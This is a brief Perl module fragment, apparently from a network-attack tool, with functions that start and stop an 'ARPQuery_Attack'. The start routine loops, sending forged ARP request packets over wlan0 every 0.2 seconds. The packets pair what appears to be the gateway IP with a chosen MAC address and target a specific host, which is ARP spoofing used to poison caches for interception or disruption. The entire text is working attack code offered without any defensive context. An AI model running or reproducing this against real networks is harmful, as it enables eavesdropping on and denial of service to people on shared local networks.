my $arpquery_attackstatut = 1;
sub ARPQuery_Attack_Stop{
	$arpquery_attackstatut = 0;
}

sub ARPQuery_Attack_Start{
	while ($arpquery_attackstatut) {
		Net::ARP::send_packet('wlan0',                 # Device
            '10.8.97.1',          # Source IP
            '10.8.108.55',          # Destination IP
            '94:db:c9:47:dc:6d',  # Source MAC
            '20:10:7a:f9:8d:d6',  # Destinaton MAC
            'request');             # ARP operation
		Time::HiRes::sleep(0.2);
	}
}

return 1;